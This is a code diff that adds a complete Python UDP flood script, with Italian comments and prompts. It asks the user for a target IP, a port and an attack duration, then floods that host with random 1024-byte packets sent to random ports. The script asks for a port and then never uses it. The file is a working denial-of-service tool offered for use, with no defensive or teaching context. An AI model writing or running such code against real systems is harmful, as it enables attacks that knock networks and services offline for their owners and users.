@@ -1,0 +1,80 @@
+import socket
+import random
+import time
+
+def validate_ip(ip):
+    try:
+        # Prova a convertire l'IP inserito in un indirizzo valido
+        socket.inet_aton(ip)
+        return True
+    except socket.error:
+        return False
+
+def validate_port(port):
+    return 0 <= port <= 65535
+
+def validate_duration(duration):
+    return duration > 0
+
+def udp_flood(target_ip, target_port, duration):
+    # Creiamo un socket UDP
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Dati casuali da inviare
+    bytes_to_send = random._urandom(1024)  # Pacchetto UDP di 1024 byte
+    
+    # Tempo di fine attacco
+    end_time = time.time() + duration
+    sent_packets = 0
+    
+    print(f"Starting UDP flood to {target_ip}:{target_port} for {duration} seconds...")
+    
+    while time.time() < end_time:
+        # Porta casuale nel range 1-65535
+        random_port = random.randint(1, 65535)
+        
+        try:
+            # Invia i dati al target sulla porta casuale
+            sock.sendto(bytes_to_send, (target_ip, random_port))
+            sent_packets += 1
+            print(f"Packet {sent_packets} sent to {target_ip}:{random_port}")
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+
+    print(f"UDP flood finished. Total packets sent: {sent_packets}")
+    sock.close()
+
+# Richiedi l'IP del target e valida l'input
+while True:
+    target_ip = input("Inserisci qui l'IP del dispositivo bersaglio: ")
+    if validate_ip(target_ip):
+        break
+    else:
+        print("Errore: IP non valido. Riprova inserendo un indirizzo IP nel formato corretto (es: 192.168.1.1)")
+
+# Richiedi la porta e valida l'input
+while True:
+    try:
+        target_port = int(input("Inserisci la porta bersaglio (0-65535): "))
+        if validate_port(target_port):
+            break
+        else:
+            print("Errore: Porta non valida. Inserisci un numero tra 0 e 65535.")
+    except ValueError:
+        print("Errore: Devi inserire un numero intero.")
+
+# Richiedi la durata dell'attacco e valida l'input
+while True:
+    try:
+        duration = int(input("Inserisci la durata dell'attacco in secondi: "))
+        if validate_duration(duration):
+            break
+        else:
+            print("Errore: La durata deve essere un numero positivo.")
+    except ValueError:
+        print("Errore: Devi inserire un numero intero.")
+
+# Esegui l'attacco UDP flood
+udp_flood(target_ip, target_port, duration)
+
